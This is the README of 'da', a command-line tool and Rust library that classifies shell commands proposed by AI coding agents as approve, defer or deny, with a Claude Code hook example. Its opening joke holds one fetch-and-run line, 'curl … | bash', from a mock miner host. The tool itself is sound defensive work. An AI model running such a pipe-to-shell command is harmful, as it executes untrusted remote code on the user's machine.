<p align="center">
  <img src="logo.jpg" alt="da — yes." width="100%">
</p>

<h3 align="center">Stop training your `y` muscle</h3>

<p align="center">bash-command classifier for agents</p>

## Why

**Agent**: Runs `ls -la` for the hundredth time

**You**: hit `y`

**Agent**: runs `curl https://totally-not-bitcoin-miner.sh | bash`

**You**: hit `y`

## Install

From cargo:

```sh
cargo install dabin
```

From source:

```sh
git clone https://github.com/amenocturne/da
cd da && cargo install --path .
```

From brew:

```sh
brew install amenocturne/tap/da
```

From nix:

```sh
nix profile install github:amenocturne/da
```

## How it works

```
da --path PATH [policy flags...]
  stdin: a bash command
  exit:  0 = approve, 1 = defer, 2 = deny, 64 = usage error
```

For each segment of the parsed command, `da` asks each enabled policy "is it safe?":

- all segments say yes - approved
- some segments say yes and some unmatched - defer
- any segment says no - rejected

Some rules are always on, regardless of which policies you enable:

- `cd` and bare assignments (`FOO=bar`) - **approve** (they touch nothing external)
- Shell binaries (`bash`, `sh`, `zsh`, …) - **defer** (too much surface)
- `env` and `time` - **recurse** into the wrapped command
- **redirect targets** must be `/dev/null`, `/dev/std{out,err,in}`, an fd reference, or `-`
- `$(…)`, backticks, heredocs, process substitution, `[[…]]`, subshells - **defer** (the parser bails)

## Policies

Two shapes. **Bare flags** for capabilities with one knob. **Tool-scoped flags**
with comma-separated capability lists where one binary has many ops.

### Bare

| Flag            | What it allows                                                                                                                                                                                                                                                                                                               |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--read-only`   | Cross-platform read-only binaries (`find`, `ls`, `cat`, `grep`, `head`, `tail`, `wc`, `du`, `sort`, `uniq`, `cut`, `tr`, `jq`, `diff`, `ps`, `lsof`, `dig`, `ldd`, …) plus bounded forms of `sed` (no `-i`, no `e` flag), `awk` (no `system()`, no file/pipe writes), `find` (no `-exec`/`-delete`/etc.), `sysctl` (no `-w`) |
| `--macos-only`  | macOS extras (`mdfind`, `mdls`, `sw_vers`, `system_profiler`, `hostinfo`, `vm_stat`, `pbpaste`, `otool`, `dyld_info`)                                                                                                                                                                                                        |
| `--help-bypass` | `<binary> --help\|-h\|--version\|-V\|help\|version` for _any_ binary — explicit trust call, lets unknown binaries run for help text                                                                                                                                                                                          |
| `--mkdir-cwd`   | `mkdir` when every path argument resolves under `--path`                                                                                                                                                                                                                                                                     |

### Tool-scoped

```
--git CAPS     where CAPS ⊆ { read, add, commit, restore-staged, tag, fetch, pull, push }
--cargo CAPS   where CAPS ⊆ { local, crates-install, crates-publish }
```

#### git

| cap                       | covers                                                                                                                                                      |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `read`                    | `status`, `log`, `diff`, `show`, `branch` (read), `blame`, `ls-files`, `ls-tree`, `rev-parse`, `rev-list`, `describe`, `reflog`, `shortlog`, `config --get` |
| `add`                     | `git add`                                                                                                                                                   |
| `commit`                  | `git commit` (excludes `--amend`, `--no-verify`, `--no-gpg-sign`)                                                                                           |
| `restore-staged`          | `git restore --staged` (or `-S`)                                                                                                                            |
| `tag`                     | `git tag` (local until pushed)                                                                                                                              |
| `fetch` / `pull` / `push` | the obvious one each                                                                                                                                        |
| —                         | _always defer:_ `reset --hard`, `clean -fd`, `rebase`, `merge`, `rm`, `stash`, `cherry-pick`                                                                |

#### cargo

| cap              | covers                                                                                                                                                                                                                                                                         |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `local`          | Anything that doesn't write to a registry: `build`, `test`, `check`, `doc`, `tree`, `metadata`, `search`, `read-manifest`, `locate-project`, `pkgid`, `verify-project`, `fetch`, `help`, `version`, `run`, `bench`, `fmt`, `clippy`, `clean`, `update` (`--fix` always defers) |
| `crates-install` | `cargo install`                                                                                                                                                                                                                                                                |
| `crates-publish` | `cargo publish`                                                                                                                                                                                                                                                                |

## Examples

Read-only stuff sails through

```sh
printf 'ls -la' | da --read-only
# → exit 0
```

Pipes: every segment must approve

```sh
printf 'find . -name "*.rs" | sort | uniq | wc -l' | da --read-only
# → exit 0
```

Compose git capabilities

```sh
printf 'git status && git add . && git commit -m wip' | da --git read,add,commit
# → exit 0
```

Same stack rejects what you didn't list

```sh
printf 'git push' | da --git read,add,commit
# → exit 1
```

Bound mkdir to a project

```sh
printf 'mkdir -p src/components' | da --path /repo --mkdir-cwd
# → exit 0
printf 'mkdir -p /etc/foo'        | da --path /repo --mkdir-cwd
# → exit 1
```

`--help` for any binary, even ones you don't otherwise trust

```sh
printf 'terraform --help' | da --help-bypass
# → exit 0
```

No flags = usage error (no implicit defaults)

```sh
printf 'ls' | da
# → exit 64
```

## As a Claude Code hook

`da` is the engine; the JSON dance lives in a wrapper

Drop this as `cc` hook for PreToolUse Bash:

```sh
#!/bin/bash
# .claude/hooks/da/hook.sh
set -euo pipefail
input=$(cat)
[ "$(jq -r '.tool_name // empty' <<<"$input")" = "Bash" ] || exit 0
cmd=$(jq -r '.tool_input.command // empty' <<<"$input")
path=$(jq -r '.cwd // empty' <<<"$input")
[ -z "$cmd" ] && exit 0

printf '%s' "$cmd" | da --path "$path" \
  --read-only --macos-only --help-bypass --mkdir-cwd \
  --git read,add,commit \
  --cargo local
case $? in
  0) echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}' ;;
  2) echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny"}}' ;;
  *) : ;;  # defer / error → silent, normal prompt flow
esac
```

Other harnesses: same data, different shape, `da` doesn't care.

## Library API

The crate (`dabin`) exposes the engine for embedders composing their own classification pipeline:

```rust
use std::path::Path;
use dabin::{classify, Decision, Policy};
use dabin::policies::{READ_ONLY, GIT_READ, CARGO_LOCAL};

let stack: &[&Policy] = &[&READ_ONLY, &GIT_READ, &CARGO_LOCAL];
match classify("git status && cargo build", Some(Path::new("/repo")), stack) {
    Decision::Approve => println!("yes."),
    Decision::Defer   => println!("ask the human"),
    Decision::Deny    => println!("no."),
}
```

Custom policies are first-class — define your own `Policy` value with a verify
fn and pass it in alongside the built-ins. See
[`src/policies.rs`](./src/policies.rs) for the shape.

## Acknowledgements

The bash test corpus under `tests/corpus/` is vendored from the
[Parable](https://github.com/ldayton/Parable) bash-parser test suite (MIT)
via [rable](https://github.com/mpecan/rable) (MIT). Attribution lives in
[`tests/corpus/NOTICE.md`](./tests/corpus/NOTICE.md).

## License

[MIT](./LICENSE).
